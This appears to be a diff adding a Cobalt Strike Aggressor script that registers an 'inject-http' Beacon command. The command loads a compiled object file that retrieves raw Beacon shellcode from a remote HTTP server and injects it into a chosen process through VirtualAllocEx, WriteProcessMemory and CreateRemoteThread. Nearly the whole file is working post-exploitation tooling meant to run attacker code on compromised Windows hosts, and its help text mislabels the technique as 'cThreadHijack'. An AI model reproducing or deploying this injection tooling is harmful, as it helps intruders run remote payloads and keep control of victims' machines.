@@ -1,0 +1,44 @@
+# Register help/usage for inject-http
+beacon_command_register(
+"RemoteShellcodeExec",
+"RemoteShellcodeExec: Retrieving payload over HTTP and injecting it in a remote process.",
+"\nUsage: inject-http PID\n".
+"\ncThreadHijack works by injecting raw Beacon shellcode which is retrieved by a remote HTTP server, into a remote process, defined by the user-supplied PID argument, via VirtualAllocEx and WriteProcessMemory. Then, spawn a new remote thread via CreateRemoteThread".
+"\nExample usage: inject-http 3564\n"
+);
+
+alias inject-http {
+
+    # Alias for Beacon ID and args
+    local('$bid $listener $pid');
+    
+    # Set the number of arguments
+    ($bid, $pid) = @_;
+
+    # Determine the amount of arguments
+    if (size(@_) != 2)
+    {
+        berror($bid, "Error! Please enter a valid PID");
+	return;
+    }
+
+    # Read in the BOF
+    $handle = openf(script_resource("inject-http.o"));
+    $data = readb($handle, -1);
+    closef($handle);
+
+    # Verify PID is an integer
+    if ((!-isnumber $pid) || (int($pid) <= 0))
+    {
+        berror($bid, "Please enter a valid PID!\n");
+        return;
+    }
+    
+    # Pack the arguments
+    # 'i' is an integer
+    $args = bof_pack($bid, "i", $pid);
+
+    # Run the BOF
+    # go = Entry point of the BOF
+    beacon_inline_execute($bid, $data, "go", $args);
+}
